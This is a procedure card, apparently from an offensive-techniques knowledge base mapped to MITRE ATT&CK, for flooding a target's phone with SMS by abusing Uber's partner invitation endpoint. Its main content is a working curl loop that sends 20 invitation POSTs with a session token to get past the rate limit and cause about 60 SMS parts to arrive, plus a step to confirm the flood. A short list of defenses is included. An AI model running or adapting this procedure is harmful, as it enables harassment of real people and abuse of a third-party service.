---
id: proc-uber-trigger-001
tags:
  - sms-spam
  - rate-limit-bypass
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/send-uber-invitation-post]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:39.605Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-Initial-SMS-Send

## Summary

This procedure sends a threshold number of requests to Uber's invitation endpoint to exceed the soft rate limit, triggering the initial batch of SMS messages to the target, which split into 60 parts due to long content.

## Description

After queuing via fuzzing, additional targeted POST requests (around 20) force the system to process and send the first wave of invitations. The SMS content is lengthy, causing each message to split into three parts, amplifying the flood to 60 SMS per batch. This exploits the lack of strong rate limiting and verification, leading to immediate harassment. Target environment is the web-based partners portal; outcomes include user frustration, potential roaming charges, and privacy disturbances.

## Requirements

1. Queued invitations from prior fuzzing step
2. Active session with CSRF token and cookies
3. curl or similar HTTP client for manual sends

## Defense

Defensive measures and detection strategies:

- Harden rate limits to prevent threshold crossing (e.g., global cap of 10 invitations/day per user)
- Shorten SMS content to avoid splitting and reduce impact
- Log and alert on bursty request patterns post-fuzzing
- Verify delivery status before retries

## Objectives

1. Initiate the first SMS flood batch
2. Demonstrate message splitting for amplified spam
3. Highlight absence of immediate opt-out enforcement

## Instructions

### Step 1: Send Threshold Requests

**Context**: Manually replicate the invitation POST 20 times to trigger the send mechanism.

**Command** ([[commands/send-uber-invitation-post]]):
```bash
for i in {1..20}; do
  curl -X POST https://partners.uber.com/driver_invitations \
    -H "Content-Type: application/json" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "Referer: https://partners.uber.com/referrals/" \
    -b "Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" \
    -d '{"_csrf_token":"1464319290-01-TE_leQUArIag4-5PKfW4wUkBccZdc_thW8kqNBmFFu4=","emails":[],"mobiles":["+████████"],"source":"dashboard"}'
  sleep 1  # Avoid accidental local rate limits

done
```

> This loop sends 20 requests, crossing the threshold. Expected output: HTTP 200 responses; system queues for send, resulting in 60 SMS (20 messages x 3 parts) to target.

### Step 2: Verify Initial Flood

**Context**: Confirm receipt on the target phone to validate trigger.

**Command** ([[commands/send-uber-invitation-post]]):
```bash
# No additional command; monitor target device for incoming SMS
```

> Observe 60 SMS parts arriving shortly after requests. Success if flood occurs without blocks.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/send-uber-invitation-post]]

## Tools Used


## Tags

- sms-spam
- rate-limit-bypass
